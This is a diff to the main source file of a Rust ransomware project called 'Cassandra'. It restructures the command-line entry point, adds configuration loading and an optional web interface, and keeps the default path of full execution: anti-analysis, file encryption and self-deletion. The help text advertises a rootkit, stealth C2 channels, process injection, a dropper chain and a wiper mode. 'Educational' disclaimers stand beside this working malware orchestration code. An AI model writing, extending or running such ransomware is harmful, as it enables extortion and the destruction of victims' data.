@@ -9,6 +9,9 @@ mod injection;
 mod reflective;
 mod stealth_comm;
 mod dropper;
+mod config;
+#[cfg(feature = "web")]
+mod web;
 
 use rayon::prelude::*;
 use std::process::Command;
@@ -19,37 +22,118 @@ use base64::{Engine, engine::general_purpose::STANDARD};
 
 include!(concat!(env!("OUT_DIR"), "/poly_key.rs"));
 
-// Show help menu
-fn show_help() {
-    println!("🎯 Cassandra Ransomware - Advanced Educational Implementation");
-    println!("========================================================");
-    println!();
-    println!("USAGE:");
-    println!("  cargo run                    # 🚨 FULL EXECUTION (DANGER!)");
-    println!("  cargo run -- --demo          # 🛡️  SAFE DEMO MODE");
-    println!("  cargo run -- --help          # 📖 Show this help");
-    println!();
-    println!("DEVELOPER OPTIONS:");
-    println!("  cargo run -- test            # 🔧 Test dropper chain only");
-    println!("  cargo run -- integration     # 🔗 Test all components");
-    println!();
-    println!("FEATURES:");
-    println!("  ✅ AI-powered file targeting");
-    println!("  ✅ Kernel-level rootkit (SSDT hooking)");
-    println!("  ✅ Multi-channel stealth C2");
-    println!("  ✅ Process injection & hollowing");
-    println!("  ✅ In-memory execution");
-    println!("  ✅ Multi-stage dropper chain");
-    println!("  ✅ Advanced self-deletion");
-    println!();
-    println!("⚠️  WARNING: This is for educational purposes only!");
-    println!("🚫 Do not run on production systems!");
-    println!("🛡️  Use --demo for safe testing");
+// Global configuration
+lazy_static::lazy_static! {
+    pub static ref CONFIG: config::Config = {
+        config::Config::load().unwrap_or_else(|e| {
+            eprintln!("Failed to load config: {}", e);
+            config::Config::default()
+        })
+    };
 }
 
-// Safe demo mode - shows all features without risk
+// Web server entry point
+#[cfg(feature = "web")]
+pub async fn start_web_server() {
+    if let Err(e) = web::start_server().await {
+        eprintln!("Web server error: {}", e);
+    }
+}
+
+// Main function - now supports both CLI and web modes
+fn main() {
+    // Load configuration
+    if let Err(e) = config::Config::load() {
+        eprintln!("Warning: Could not load config.toml: {}", e);
+        eprintln!("Using default configuration...");
+    }
+
+    // Check for web server mode
+    let args: Vec<String> = std::env::args().collect();
+
+    if args.len() > 1 && args[1] == "--web" {
+        #[cfg(feature = "web")]
+        {
+            println!("Starting {} Web Interface v{}...", CONFIG.general.name, CONFIG.general.version);
+            // Run async web server
+            tokio::runtime::Runtime::new()
+                .unwrap()
+                .block_on(async {
+                    start_web_server().await;
+                });
+        }
+        #[cfg(not(feature = "web"))]
+        {
+            println!("Web feature not enabled. Compile with --features web");
+            std::process::exit(1);
+        }
+    } else {
+        // Original CLI logic
+        run_cli_mode(args);
+    }
+}
+
+fn run_cli_mode(args: Vec<String>) {
+    // Check for command line arguments
+    if args.len() > 1 {
+        match args[1].as_str() {
+            "--help" | "-h" => {
+                show_help();
+                return;
+            }
+            "--demo" | "--safe" => {
+                if CONFIG.demo.safe_mode {
+                    println!("🛡️ SAFE DEMO MODE - No files will be encrypted!");
+                    println!("This mode demonstrates all features without any risk.");
+                    run_demo_mode();
+                } else {
+                    println!("❌ Demo mode disabled in configuration");
+                }
+                return;
+            }
+            "test" => {
+                if CONFIG.development.test_mode {
+                    println!("Running in TEST MODE - No actual execution");
+                    if let Err(e) = dropper::test_dropper_chain() {
+                        eprintln!("Test failed: {}", e);
+                    }
+                } else {
+                    println!("❌ Test mode disabled in configuration");
+                }
+                return;
+            }
+            "integration" => {
+                if CONFIG.development.integration_test {
+                    println!("Running INTEGRATION TEST - Testing all components together");
+                    test_integration();
+                } else {
+                    println!("❌ Integration test disabled in configuration");
+                }
+                return;
+            }
+            _ => {}
+        }
+    }
+
+    // Default: Full ransomware execution (DANGER!)
+    if !CONFIG.development.test_mode {
+        println!("🚨 WARNING: This will encrypt files on your system!");
+        println!("Press Ctrl+C within {} seconds to cancel...", CONFIG.stealth.delay_between_operations / 1000);
+
+        for i in (1..=(CONFIG.stealth.delay_between_operations / 1000)).rev() {
+            println!("{}...", i);
+            thread::sleep(Duration::from_secs(1));
+        }
+    }
+
+    // Polymorphic execution order based on compile-time key
+    let order_variant = POLY_KEY % 4;
+
+    // Continue with original logic...
+    execute_ransomware(order_variant);
+}
 fn run_demo_mode() {
-    println!("🎭 Starting Cassandra Ransomware Demo Mode");
+    println!("🎭 Starting cassandra-ransomeware Ransomware Demo Mode");
     println!("==========================================");
 
     // 1. Show rootkit capabilities
@@ -295,52 +379,7 @@ fn basic_anti_analysis() {
     }
 }
 
-fn main() {
-    // Check for command line arguments
-    let args: Vec<String> = std::env::args().collect();
-
-    // Show help if requested
-    if args.len() > 1 && (args[1] == "--help" || args[1] == "-h") {
-        show_help();
-        return;
-    }
-
-    // Safe demo mode - no actual encryption
-    if args.len() > 1 && (args[1] == "--demo" || args[1] == "--safe") {
-        println!("🛡️ SAFE DEMO MODE - No files will be encrypted!");
-        println!("This mode demonstrates all features without any risk.");
-        run_demo_mode();
-        return;
-    }
-
-    // Test mode for developers
-    if args.len() > 1 && args[1] == "test" {
-        println!("Running in TEST MODE - No actual execution");
-        if let Err(e) = dropper::test_dropper_chain() {
-            eprintln!("Test failed: {}", e);
-        }
-        return;
-    }
-
-    // Integration test for developers
-    if args.len() > 1 && args[1] == "integration" {
-        println!("Running INTEGRATION TEST - Testing all components together");
-        test_integration();
-        return;
-    }
-
-    // Default: Full ransomware execution (DANGER!)
-    println!("🚨 WARNING: This will encrypt files on your system!");
-    println!("Press Ctrl+C within 5 seconds to cancel...");
-
-    for i in (1..=5).rev() {
-        println!("{}...", i);
-        thread::sleep(Duration::from_secs(1));
-    }
-
-    // Polymorphic execution order based on compile-time key
-    let order_variant = POLY_KEY % 4;
-
+fn execute_ransomware(order_variant: u8) {
     // 1. Anti-analysis ก่อนเลย
     basic_anti_analysis();
 
@@ -556,4 +595,46 @@ fn main() {
             let _ = std::fs::remove_file(exe_path);
         }
     }
+}
+
+fn show_help() {
+    println!("🛡️ {} v{} - {}", CONFIG.general.name, CONFIG.general.version, CONFIG.general.description);
+    println!("{}", "=".repeat(60));
+    println!();
+    println!("USAGE:");
+    println!("  cargo run                    # Full execution (DANGER!)");
+    println!("  cargo run -- --demo          # Safe demo mode");
+    println!("  cargo run -- --safe          # Safe demo mode");
+    println!("  cargo run -- --web           # Start web interface");
+    println!("  cargo run -- --help          # Show this help");
+    println!("  cargo run -- test            # Test dropper chain");
+    println!("  cargo run -- integration     # Integration test");
+    println!();
+    println!("CONFIGURATION:");
+    println!("  Edit config.toml to customize settings");
+    println!("  - Encryption algorithm: {}", CONFIG.encryption.algorithm);
+    println!("  - Parallel workers: {}", CONFIG.encryption.parallel_workers);
+    println!("  - AI targeting: {}", if CONFIG.ai_targeting.enabled { "enabled" } else { "disabled" });
+    println!("  - Web interface port: {}", CONFIG.web_interface.port);
+    println!();
+    println!("FEATURES:");
+    println!("  🔧 Advanced Rootkit (SSDT hooking, DKOM)");
+    println!("  🌐 Stealth C2 (DNS, ICMP, Domain Fronting)");
+    println!("  🤖 AI-Powered Targeting");
+    println!("  📦 Multi-Stage Dropper Chain");
+    println!("  💉 Process Injection");
+    println!("  🔐 Hardware-Bound Encryption");
+    println!("  🧹 Anti-Forensic Features");
+    println!("  💣 Wiper Mode");
+    println!("  🌐 Web Interface (optional)");
+    println!();
+    println!("WARNING:");
+    println!("  This is an EDUCATIONAL IMPLEMENTATION only!");
+    println!("  Running without --demo will encrypt files!");
+    println!("  Use --demo for safe demonstration.");
+    println!();
+    println!("WEB INTERFACE:");
+    println!("  Compile with --features web for web interface");
+    println!("  Access at http://{}:{}", CONFIG.web_interface.host, CONFIG.web_interface.port);
+    println!();
 }
